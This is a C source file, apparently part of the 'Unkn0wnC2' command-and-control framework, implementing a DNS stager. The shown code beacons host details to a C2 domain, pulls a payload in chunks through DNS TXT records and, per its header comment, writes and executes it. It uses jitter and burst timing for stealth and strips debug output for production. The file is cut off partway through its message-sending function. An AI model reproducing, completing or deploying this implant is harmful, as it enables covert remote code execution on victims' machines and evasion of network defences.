/*
 * Unkn0wnC2 DNS Stager
 * 
 * Lightweight C stager that retrieves the full client via DNS TXT records.
 * 
 * Encoding: Base36 (not encrypted) for DNS compatibility
 * - Stager messages: Base36 encoded for DNS-safe subdomain transmission
 * - Server responses: Base36 encoded in TXT record data
 * - Client data: Base64 encoded (within base36-wrapped CHUNK messages)
 * 
 * Why Base36 instead of encryption?
 * - Keeps stager binary small (~30KB)
 * - No AES library dependency
 * - Base36 uses only 0-9, a-z (DNS-safe characters)
 * - Provides obscurity without security overhead
 * - Full client uses AES-GCM encryption for actual C2 operations
 * 
 * Protocol Flow:
 * 1. Stager sends: base36(STG|IP|OS|ARCH) via DNS subdomain query
 * 2. Server responds: base36(META|<session_id>|<total_chunks>) in TXT record
 * 3. Stager sends: base36(CHUNK|0|IP|session_id) to request chunk 0
 * 4. Server responds: CHUNK|<base64_data> in TXT record (PLAIN TEXT, not base36)
 * 5. Loop CHUNK requests for all chunks
 * 6. Stager: assemble base64 → decode → decompress → write → execute
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define PLATFORM "Windows"
    #define PATH_SEP "\\"
    #define NULL_DEVICE "NUL"
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/wait.h>
    #include <sys/stat.h>
    #define PLATFORM "Linux"
    #define PATH_SEP "/"
    #define NULL_DEVICE "/dev/null"
#endif

// Debug mode - set to 0 for production to remove all output
#ifndef DEBUG_MODE
    #define DEBUG_MODE 0
#endif

#if DEBUG_MODE
    #define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
    #define DIAG_PRINT(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...) do {} while(0)
    #define DIAG_PRINT(fmt, ...) do {} while(0)
#endif

// Configuration - these should match your server setup
#ifndef DNS_SERVER
    #define DNS_SERVER "8.8.8.8"  // Default if not set by build system
#endif
#define DNS_PORT 53
#ifndef C2_DOMAINS
    #define C2_DOMAINS "secwolf.net"  // Comma-separated domains, default if not set by build system
#endif
#define MAX_LABEL_LEN 63
#define MAX_DOMAIN_LEN 253
#define MAX_TXT_LEN 255
#define DNS_TIMEOUT 10
#define MAX_DOMAINS 10

// MD5 Constants
#define MD5_DIGEST_SIZE 16

// Retry configuration - can be overridden at build time
#ifndef MAX_RETRIES
    #define MAX_RETRIES 5
#endif
#ifndef RETRY_DELAY_SECONDS
    #define RETRY_DELAY_SECONDS 3  // Delay between retry attempts
#endif

// Jitter configuration for stealth - can be overridden at build time
// Timing model: Request chunks in rapid bursts, then pause between bursts
// Example with CHUNKS_PER_BURST=5, MIN_CHUNK_DELAY_MS=60000, MAX_CHUNK_DELAY_MS=120000, BURST_PAUSE_MS=120000:
//   - Request 5 chunks rapidly (no delay within burst)
//   - After 5 chunks: pause for random(60-120s) + 120s = 180-240 seconds total
//   - Request next 5 chunks rapidly
//   - Repeat...
#ifndef MIN_CHUNK_DELAY_MS
    #define MIN_CHUNK_DELAY_MS 60000   // Minimum jitter delay between bursts (milliseconds) - 60s default
#endif
#ifndef MAX_CHUNK_DELAY_MS
    #define MAX_CHUNK_DELAY_MS 120000  // Maximum jitter delay between bursts (milliseconds) - 120s default
#endif
#ifndef CHUNKS_PER_BURST
    #define CHUNKS_PER_BURST 5         // Number of chunks to request rapidly before pausing
#endif
#ifndef BURST_PAUSE_MS
    #define BURST_PAUSE_MS 120000      // Additional pause between bursts (milliseconds) - 120s default
#endif

#define MAX_CHUNKS 10000  // Maximum chunks to support
#define CHUNK_SIZE 370  // DNS-safe chunk size for 512-byte UDP limit (matches Master/Server)

// DNS header structure
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
} dns_header_t;

// Base64 decoding table
static const unsigned char base64_decode_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

/*
 * Base36 encoding - encode binary data to base36 string (0-9, a-z)
 * This matches the server's base36 encoding for DNS compatibility
 */
static void base36_encode(const unsigned char *input, size_t input_len, char *output, size_t output_size) {
    // Handle empty input
    if (input_len == 0 || output_size == 0) {
        if (output_size > 0) {
            output[0] = '0';
            output[1] = '\0';
        }
        return;
    }
    
    // Copy input to working buffer (big-endian byte array)
    unsigned char num[512] = {0};
    size_t num_len = input_len;
    
    if (num_len > sizeof(num)) {
        num_len = sizeof(num);
    }
    
    memcpy(num, input, num_len);
    
    // Build base36 string by repeatedly dividing by 36
    char result[1024];
    int result_len = 0;
    
    // Keep dividing until number is zero
    while (num_len > 0) {
        // Check if all bytes are zero
        int is_zero = 1;
        for (size_t i = 0; i < num_len; i++) {
            if (num[i] != 0) {
                is_zero = 0;
                break;
            }
        }
        
        if (is_zero) {
            break;
        }
        
        // Divide the big-endian number by 36
        unsigned int remainder = 0;
        for (size_t i = 0; i < num_len; i++) {
            unsigned int current = remainder * 256 + num[i];
            num[i] = current / 36;
            remainder = current % 36;
        }
        
        // Add the remainder as a base36 digit
        if (result_len < (int)sizeof(result) - 1) {
            if (remainder < 10) {
                result[result_len++] = '0' + remainder;
            } else {
                result[result_len++] = 'a' + (remainder - 10);
            }
        }
        
        // Trim leading zeros from num to keep it efficient
        size_t first_nonzero = 0;
        while (first_nonzero < num_len && num[first_nonzero] == 0) {
            first_nonzero++;
        }
        
        if (first_nonzero > 0 && first_nonzero < num_len) {
            memmove(num, num + first_nonzero, num_len - first_nonzero);
            num_len -= first_nonzero;
        } else if (first_nonzero >= num_len) {
            num_len = 0; // All zeros
        }
    }
    
    // Result is built in reverse order, so reverse it
    if (result_len == 0) {
        if (output_size > 1) {
            output[0] = '0';
            output[1] = '\0';
        }
    } else {
        size_t copy_len = result_len < (int)output_size - 1 ? result_len : output_size - 1;
        for (size_t i = 0; i < copy_len; i++) {
            output[i] = result[result_len - 1 - i];
        }
        output[copy_len] = '\0';
    }
}


/*
 * Base36 decoding - decode base36 string to binary data
 */
static size_t base36_decode(const char *input, unsigned char *output, size_t output_size) {
    size_t input_len = strlen(input);
    if (input_len == 0) return 0;
    
    // Initialize result as zero
    unsigned char result[512] = {0};
    size_t result_len = 1; // Start with one zero byte
    
    // Process each base36 digit from left to right
    for (size_t i = 0; i < input_len; i++) {
        char c = tolower(input[i]); // Convert to lowercase for case-insensitive processing
        unsigned int digit;
        
        // Convert character to digit value (0-35)
        if (c >= '0' && c <= '9') {
            digit = c - '0';
        } else if (c >= 'a' && c <= 'z') {
            digit = c - 'a' + 10;
        } else {
            continue; // Skip invalid characters
        }
        
        // Multiply entire result by 36 and add new digit
        unsigned int carry = digit;
        
        // Process from least significant byte (right) to most significant (left)
        for (int j = result_len - 1; j >= 0; j--) {
            unsigned int temp = result[j] * 36 + carry;
            result[j] = temp & 0xFF;
            carry = temp >> 8;
        }
        
        // If there's carry, need to extend the result
        while (carry > 0) {
            if (result_len >= sizeof(result)) {
                return 0; // Overflow
            }
            
            // Shift all bytes right to make room at the front
            for (int j = result_len; j > 0; j--) {
                result[j] = result[j - 1];
            }
            result[0] = carry & 0xFF;
            carry >>= 8;
            result_len++;
        }
    }
    
    // Find the first non-zero byte (strip leading zeros)
    size_t start = 0;
    while (start < result_len && result[start] == 0) {
        start++;
    }
    
    // Handle the all-zeros case
    if (start >= result_len) {
        if (output_size > 0) {
            output[0] = 0;
            return 1;
        }
        return 0;
    }
    
    // Copy result to output
    size_t final_len = result_len - start;
    if (final_len > output_size) {
        final_len = output_size;
    }
    
    memcpy(output, result + start, final_len);
    return final_len;
}

/*
 * Base64 decode - decode base64 string to binary
 */
static size_t base64_decode(const char *input, unsigned char *output, size_t output_size) {
    size_t input_len = strlen(input);
    size_t output_len = 0;
    uint32_t bits = 0;
    int bit_count = 0;
    
    for (size_t i = 0; i < input_len; i++) {
        unsigned char c = base64_decode_table[(unsigned char)input[i]];
        if (c == 64) {
            if (input[i] == '=') break;
            continue;
        }
        
        bits = (bits << 6) | c;
        bit_count += 6;
        
        if (bit_count >= 8) {
            if (output_len >= output_size) return 0;
            output[output_len++] = (bits >> (bit_count - 8)) & 0xFF;
            bit_count -= 8;
        }
    }
    
    return output_len;
}

/*
 * Simple MD5 implementation for checksum verification
 * Based on RFC 1321 - lightweight and sufficient for integrity checks
 */
#define MD5_F(x, y, z) (((x) & (y)) | ((~x) & (z)))
#define MD5_G(x, y, z) (((x) & (z)) | ((y) & (~z)))
#define MD5_H(x, y, z) ((x) ^ (y) ^ (z))
#define MD5_I(x, y, z) ((y) ^ ((x) | (~z)))
#define MD5_ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))

static void md5_transform(uint32_t state[4], const unsigned char block[64]) {
    uint32_t a = state[0], b = state[1], c = state[2], d = state[3];
    uint32_t x[16];
    
    // Decode block into 16 32-bit words
    for (int i = 0, j = 0; i < 16; i++, j += 4) {
        x[i] = ((uint32_t)block[j]) | (((uint32_t)block[j+1]) << 8) |
               (((uint32_t)block[j+2]) << 16) | (((uint32_t)block[j+3]) << 24);
    }
    
    // Round 1
    static const uint32_t T1[16] = {
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821
    };
    static const int S1[16] = {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22};
    for (int i = 0; i < 16; i++) {
        uint32_t tmp = a + MD5_F(b, c, d) + x[i] + T1[i];
        tmp = MD5_ROTATE_LEFT(tmp, S1[i]) + b;
        a = d; d = c; c = b; b = tmp;
    }
    
    // Round 2
    static const uint32_t T2[16] = {
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
        0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a
    };
    static const int S2[16] = {5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20};
    static const int K2[16] = {1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12};
    for (int i = 0; i < 16; i++) {
        uint32_t tmp = a + MD5_G(b, c, d) + x[K2[i]] + T2[i];
        tmp = MD5_ROTATE_LEFT(tmp, S2[i]) + b;
        a = d; d = c; c = b; b = tmp;
    }
    
    // Round 3
    static const uint32_t T3[16] = {
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665
    };
    static const int S3[16] = {4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23};
    static const int K3[16] = {5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2};
    for (int i = 0; i < 16; i++) {
        uint32_t tmp = a + MD5_H(b, c, d) + x[K3[i]] + T3[i];
        tmp = MD5_ROTATE_LEFT(tmp, S3[i]) + b;
        a = d; d = c; c = b; b = tmp;
    }
    
    // Round 4
    static const uint32_t T4[16] = {
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
    };
    static const int S4[16] = {6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21};
    static const int K4[16] = {0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9};
    for (int i = 0; i < 16; i++) {
        uint32_t tmp = a + MD5_I(b, c, d) + x[K4[i]] + T4[i];
        tmp = MD5_ROTATE_LEFT(tmp, S4[i]) + b;
        a = d; d = c; c = b; b = tmp;
    }
    
    state[0] += a; state[1] += b; state[2] += c; state[3] += d;
}

static void calculate_md5(const unsigned char *data, size_t len, unsigned char digest[MD5_DIGEST_SIZE]) {
    uint32_t state[4] = {0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476};
    unsigned char buffer[64];
    size_t buffer_len = 0;
    uint64_t total_bits = 0;
    
    // Process complete 64-byte blocks
    while (len >= 64) {
        md5_transform(state, data);
        data += 64;
        len -= 64;
        total_bits += 512;
    }
    
    // Save remaining bytes
    if (len > 0) {
        memcpy(buffer, data, len);
        buffer_len = len;
        total_bits += len * 8;
    }
    
    // Padding: append 0x80 followed by zeros
    buffer[buffer_len++] = 0x80;
    
    // If not enough room for length, process this block and start new one
    if (buffer_len > 56) {
        memset(buffer + buffer_len, 0, 64 - buffer_len);
        md5_transform(state, buffer);
        buffer_len = 0;
    }
    
    // Pad with zeros up to 56 bytes
    memset(buffer + buffer_len, 0, 56 - buffer_len);
    
    // Append length in bits (little-endian)
    for (int i = 0; i < 8; i++) {
        buffer[56 + i] = (total_bits >> (i * 8)) & 0xff;
    }
    
    md5_transform(state, buffer);
    
    // Output digest (little-endian)
    for (int i = 0; i < 4; i++) {
        digest[i*4]     = (state[i] >> 0) & 0xff;
        digest[i*4 + 1] = (state[i] >> 8) & 0xff;
        digest[i*4 + 2] = (state[i] >> 16) & 0xff;
        digest[i*4 + 3] = (state[i] >> 24) & 0xff;
    }
}

/*
 * Simple zlib decompression using system zlib
 * Returns decompressed size or 0 on failure
 */
#ifdef _WIN32
// For Windows, we'll skip compression for simplicity in the stager
// The server will send uncompressed base64 if STAGER_NO_COMPRESS is detected
static size_t decompress_data(const unsigned char *compressed, size_t comp_size,
                              unsigned char **decompressed) {
    // Just copy the data - server sends uncompressed for Windows stagers
    *decompressed = malloc(comp_size);
    if (!*decompressed) return 0;
    memcpy(*decompressed, compressed, comp_size);
    return comp_size;
}
#else
#include <zlib.h>
static size_t decompress_data(const unsigned char *compressed, size_t comp_size,
                              unsigned char **decompressed) {
    // Initial buffer size estimate (10x compressed size)
    size_t decomp_size = comp_size * 10;
    *decompressed = malloc(decomp_size);
    if (!*decompressed) return 0;
    
    z_stream strm = {0};
    strm.next_in = (unsigned char *)compressed;
    strm.avail_in = comp_size;
    strm.next_out = *decompressed;
    strm.avail_out = decomp_size;
    
    // Use inflateInit2 with 16+MAX_WBITS to handle gzip format
    if (inflateInit2(&strm, 16 + MAX_WBITS) != Z_OK) {
        free(*decompressed);
        return 0;
    }
    
    int ret = inflate(&strm, Z_FINISH);
    if (ret != Z_STREAM_END) {
        inflateEnd(&strm);
        free(*decompressed);
        return 0;
    }
    
    size_t final_size = strm.total_out;
    inflateEnd(&strm);
    return final_size;
}
#endif

/*
 * Get local IP address
 */
static void get_local_ip(char *ip_buffer, size_t buffer_size) {
    strncpy(ip_buffer, "0.0.0.0", buffer_size - 1);
    ip_buffer[buffer_size - 1] = '\0';
    
#ifdef _WIN32
    char hostname[256];
    struct hostent *host;
    
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        host = gethostbyname(hostname);
        if (host && host->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
            strncpy(ip_buffer, inet_ntoa(addr), buffer_size - 1);
            ip_buffer[buffer_size - 1] = '\0';
        }
    }
#else
    // Use a simple approach: connect to external IP to find local IP
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);
        
        if (connect(sock, (struct sockaddr *)&serv, sizeof(serv)) == 0) {
            struct sockaddr_in name;
            socklen_t namelen = sizeof(name);
            if (getsockname(sock, (struct sockaddr *)&name, &namelen) == 0) {
                inet_ntop(AF_INET, &name.sin_addr, ip_buffer, buffer_size);
            }
        }
        close(sock);
    }
#endif
}

/*
 * Get system architecture
 */
static void get_arch(char *arch_buffer, size_t buffer_size) {
#ifdef _WIN32
    strncpy(arch_buffer, "x64", buffer_size - 1);
    arch_buffer[buffer_size - 1] = '\0';
#else
    struct utsname unameData;
    if (uname(&unameData) == 0) {
        strncpy(arch_buffer, unameData.machine, buffer_size - 1);
        arch_buffer[buffer_size - 1] = '\0';
    } else {
        strncpy(arch_buffer, "unknown", buffer_size - 1);
        arch_buffer[buffer_size - 1] = '\0';
    }
#endif
}

/*
 * Encode domain name for DNS query
 * Converts "example.com" to "\x07example\x03com\x00"
 */
static size_t encode_domain_name(const char *domain, unsigned char *buffer) {
    size_t pos = 0;
    const char *start = domain;
    const char *ptr = domain;
    
    while (*ptr) {
        if (*ptr == '.') {
            size_t label_len = ptr - start;
            if (label_len > 0 && label_len <= MAX_LABEL_LEN) {
                buffer[pos++] = (unsigned char)label_len;
                memcpy(buffer + pos, start, label_len);
                pos += label_len;
            }
            start = ptr + 1;
        }
        ptr++;
    }
    
    // Last label
    size_t label_len = ptr - start;
    if (label_len > 0 && label_len <= MAX_LABEL_LEN) {
        buffer[pos++] = (unsigned char)label_len;
        memcpy(buffer + pos, start, label_len);
        pos += label_len;
    }
    
    buffer[pos++] = 0; // Null terminator
    return pos;
}

/*
 * Parse TXT record from DNS response
 * TXT records are length-prefixed strings
 */
static int parse_txt_record(const unsigned char *rdata, size_t rdlen, char *output, size_t output_size) {
    size_t pos = 0;
    size_t output_pos = 0;
    
    while (pos < rdlen) {
        unsigned char len = rdata[pos++];
        if (pos + len > rdlen || output_pos + len >= output_size) {
            break;
        }
        memcpy(output + output_pos, rdata + pos, len);
        output_pos += len;
        pos += len;
    }
    
    output[output_pos] = '\0';
    return output_pos;
}

/*
 * Skip over a domain name in DNS response (handles compression)
 */
static int skip_domain_name(const unsigned char *buffer, size_t buffer_len, size_t *offset) {
    size_t pos = *offset;
    int jumped = 0;
    
    while (pos < buffer_len) {
        unsigned char len = buffer[pos];
        
        if (len == 0) {
            *offset = pos + 1;
            return 0;
        }
        
        // Compression pointer
        if ((len & 0xC0) == 0xC0) {
            if (!jumped) {
                *offset = pos + 2;
            }
            return 0;
        }
        
        // Normal label
        pos += len + 1;
    }
    
    return -1;
}

/*
 * Get system's default DNS server
 */
static int get_system_dns(char *dns_server, size_t dns_server_size) {
#ifdef _WIN32
    // On Windows, we'll use a fallback since reading registry is complex
    // Most Windows systems can resolve through localhost or use DHCP DNS
    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
    dns_server[dns_server_size - 1] = '\0';
    return 0;
#else
    // On Linux, read /etc/resolv.conf
    FILE *resolv = fopen("/etc/resolv.conf", "r");
    if (!resolv) {
        // Fallback to common public DNS
        strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
        dns_server[dns_server_size - 1] = '\0';
        return 0;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), resolv)) {
        // Look for "nameserver" lines
        if (strncmp(line, "nameserver", 10) == 0) {
            char *ns = line + 10;
            // Skip whitespace
            while (*ns == ' ' || *ns == '\t') ns++;
            
            // Extract IP address
            int i = 0;
            while (*ns && *ns != ' ' && *ns != '\t' && *ns != '\n' && i < dns_server_size - 1) {
                dns_server[i++] = *ns++;
            }
            dns_server[i] = '\0';
            
            fclose(resolv);
            return 0;
        }
    }
    
    fclose(resolv);
    
    // No nameserver found, use fallback
    strncpy(dns_server, "8.8.8.8", dns_server_size - 1);
    dns_server[dns_server_size - 1] = '\0';
    return 0;
#endif
}

/*
 * Send DNS TXT query and receive response
 */
static int dns_query_txt(const char *domain, char *response, size_t response_size) {
    int sock;
    struct sockaddr_in dns_addr;
    unsigned char query[512];
    unsigned char answer[2048];
    size_t query_len = 0;
    char dns_server[64];
    
    // Get system's DNS server
    if (get_system_dns(dns_server, sizeof(dns_server)) != 0) {
        return -1;
    }
    
    DEBUG_PRINT("[*] dns_query_txt: %s\n", domain);
    DEBUG_PRINT("[*] Using DNS server: %s\n", dns_server);
    
#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return -1;
    }
#endif
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
#ifdef _WIN32
        WSACleanup();
#endif
        return -1;
    }
    
    DEBUG_PRINT("[*] Socket created\n");
    
    // Set receive timeout (5 seconds)
#ifdef _WIN32
    DWORD timeout = 5000; // milliseconds
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const void*)&tv, sizeof(tv));
#endif
    
    // Build DNS query
    dns_header_t *header = (dns_header_t *)query;
    header->id = htons((uint16_t)(time(NULL) & 0xFFFF));
    header->flags = htons(0x0100); // Standard query, recursion desired
    header->qdcount = htons(1);
    header->ancount = 0;
    header->nscount = 0;
    header->arcount = 0;
    query_len = sizeof(dns_header_t);
    
    // Encode domain name
    query_len += encode_domain_name(domain, query + query_len);
    
    // Question type (TXT = 16) and class (IN = 1)
    query[query_len++] = 0;
    query[query_len++] = 16; // TXT
    query[query_len++] = 0;
    query[query_len++] = 1;  // IN
    
    // Setup DNS server address
    memset(&dns_addr, 0, sizeof(dns_addr));
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
    
    DEBUG_PRINT("[*] Sending query to %s:%d (len=%zu)\n", dns_server, DNS_PORT, query_len);
    
    // Send query
    if (sendto(sock, (const char *)query, query_len, 0,
               (struct sockaddr *)&dns_addr, sizeof(dns_addr)) < 0) {
        DEBUG_PRINT("[!] sendto failed\n");
#ifdef _WIN32
        closesocket(sock);
        WSACleanup();
#else
        close(sock);
#endif
        return -1;
    }
    
    DEBUG_PRINT("[*] Query sent, waiting for response...\n");
    
    // Receive response
    socklen_t addr_len = sizeof(dns_addr);
    int recv_len = recvfrom(sock, (char *)answer, sizeof(answer), 0,
                           (struct sockaddr *)&dns_addr, &addr_len);
    
    DIAG_PRINT("[DIAG] recvfrom returned: %d bytes (buffer size: %zu)\n", recv_len, sizeof(answer));

#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
    
    if (recv_len <= 0) {
        DIAG_PRINT("[DIAG] Failed to receive response (recv_len=%d)\n", recv_len);
        DEBUG_PRINT("[!] ERROR: Failed to receive DNS response (recv_len=%d)\n", recv_len);
        if (recv_len == 0) {
            DEBUG_PRINT("[!] Connection closed by server or timeout\n");
        } else {
#ifdef _WIN32
            DEBUG_PRINT("[!] Socket error code: %d\n", WSAGetLastError());
#else
            DEBUG_PRINT("[!] Socket error: %s (errno: %d)\n", strerror(errno), errno);
#endif
        }
        return -1;
    }
    
    DEBUG_PRINT("[*] Received %d bytes\n", recv_len);
    
    if (recv_len < sizeof(dns_header_t)) {
        DIAG_PRINT("[DIAG] Response too short: %d bytes (need at least %zu)\n", 
                recv_len, sizeof(dns_header_t));
        DEBUG_PRINT("[!] ERROR: DNS response too short: %d bytes (expected at least %zu)\n", 
                   recv_len, sizeof(dns_header_t));
        DEBUG_PRINT("[!] Likely malformed DNS packet or network corruption\n");
        return -1;
    }    // Parse response header
    dns_header_t *resp_header = (dns_header_t *)answer;
    uint16_t ancount = ntohs(resp_header->ancount);
    
    DIAG_PRINT("[DIAG] Answer count: %d\n", ancount);
    DEBUG_PRINT("[*] Answer count: %d\n", ancount);
    
    if (ancount == 0) {
        DIAG_PRINT("[DIAG] No answers in DNS response\n");
        DEBUG_PRINT("[!] ERROR: No TXT records in DNS response\n");
        DEBUG_PRINT("[!] This could mean:\n");
        DEBUG_PRINT("[!]   - Domain not configured on C2 server\n");
        DEBUG_PRINT("[!]   - DNS query reached wrong server\n");
        DEBUG_PRINT("[!]   - Server not returning TXT records\n");
        return -1;
    }
    
    // Skip question section
    size_t offset = sizeof(dns_header_t);
    DIAG_PRINT("[DIAG] Starting to parse at offset: %zu\n", offset);
    if (skip_domain_name(answer, recv_len, &offset) < 0) {
        DIAG_PRINT("[DIAG] Failed to skip question domain name\n");
        return -1;
    }
    offset += 4; // Skip QTYPE and QCLASS
    DIAG_PRINT("[DIAG] After skipping question, offset: %zu\n", offset);
    
    // Parse answer section
    for (int i = 0; i < ancount && offset < recv_len; i++) {
        DIAG_PRINT("[DIAG] Parsing answer %d at offset %zu\n", i, offset);
        // Skip name
        if (skip_domain_name(answer, recv_len, &offset) < 0) {
            DIAG_PRINT("[DIAG] Failed to skip answer domain name\n");
            break;
        }
        
        if (offset + 10 > recv_len) {
            DIAG_PRINT("[DIAG] Not enough data for answer header (offset=%zu, recv_len=%d)\n", 
                    offset, recv_len);
            break;
        }
        
        uint16_t type = (answer[offset] << 8) | answer[offset + 1];
        offset += 2; // Type
        offset += 2; // Class
        offset += 4; // TTL
        
        uint16_t rdlen = (answer[offset] << 8) | answer[offset + 1];
        offset += 2;
        
        DIAG_PRINT("[DIAG] Answer type=%d, rdlen=%d, offset=%zu\n", type, rdlen, offset);
        
        if (type == 16 && offset + rdlen <= recv_len) { // TXT record
            DIAG_PRINT("[DIAG] Found TXT record, parsing %d bytes of data\n", rdlen);
            int parsed = parse_txt_record(answer + offset, rdlen, response, response_size);
            DIAG_PRINT("[DIAG] Parsed %d bytes from TXT record, result: %.80s...\n", 
                    parsed, response);
            return 0;
        }
        
        offset += rdlen;
    }
    
    DIAG_PRINT("[DIAG] No valid TXT record found in response\n");
    DEBUG_PRINT("[!] ERROR: No valid TXT records found in DNS response\n");
    DEBUG_PRINT("[!] Received %d answer(s) but none were TXT records (type 16)\n", ancount);
    return -1;
}

/*
 * Send stager message via DNS TXT query
 * Encodes message with base36 for DNS compatibility
 * Now accepts target_domain parameter for multi-domain load balancing
 */
static int send_dns_message(const char *message, const char *target_domain, char *response, size_t response_size) {
    char encoded[512];
    char domain[1024];
    
    // ALWAYS PRINT - debug encoding issue
    DIAG_PRINT("[DIAG] Message to encode: '%s' (len=%zu)\n", message, strlen(message));
    
    // Base36 encode the message (no encryption for stager)
    base36_encode((const unsigned char *)message, strlen(message), encoded, sizeof(encoded));
    
    // ALWAYS PRINT - debug encoding issue
    DIAG_PRINT("[DIAG] Encoded result: '%s' (len=%zu)\n", encoded, strlen(encoded));
    
    // Check if encoding failed (empty result)
    if (strlen(encoded) == 0) {
        DIAG_PRINT("[DIAG] ERROR: base36_encode returned empty string!\n");
        return -1;
    }
    
    // Split encoded string into DNS labels (max 63 chars per label)
    // DNS query format: <label1>.<label2>.<timestamp>.<domain> (4 labels total)
    // We can use maximum 2 labels for base36 data (126 chars max)
    // Example: aiihbk2levr6d2jmb5dve5vfqqyg2oah3neijqkiswoj89pw.1762372821.secwolf.net (3 labels)
    // Example: 71v92tj2ch04qd3mf5xqa35wsl2hl4rhwt8jzaogdby29k40dx87m15a.34lfco5q3sge90lwpz26yba.1762372821.secwolf.net (4 labels)
    char split_domain[1024];
    size_t encoded_len = strlen(encoded);
    
    if (encoded_len <= MAX_LABEL_LEN) {
        // Fits in one label: <data>.<timestamp>.<domain>
        snprintf(split_domain, sizeof(split_domain), "%s", encoded);
    } else if (encoded_len <= MAX_LABEL_LEN * 2) {
        // Split into 2 labels: <data1>.<data2>.<timestamp>.<domain>
        char label1[MAX_LABEL_LEN + 1];
        strncpy(label1, encoded, MAX_LABEL_LEN);
        label1[MAX_LABEL_LEN] = '\0';
        snprintf(split_domain, sizeof(split_domain), "%s.%s", label1, encoded + MAX_LABEL_LEN);
    } else {
        // ERROR: Encoded message too long (>126 chars)
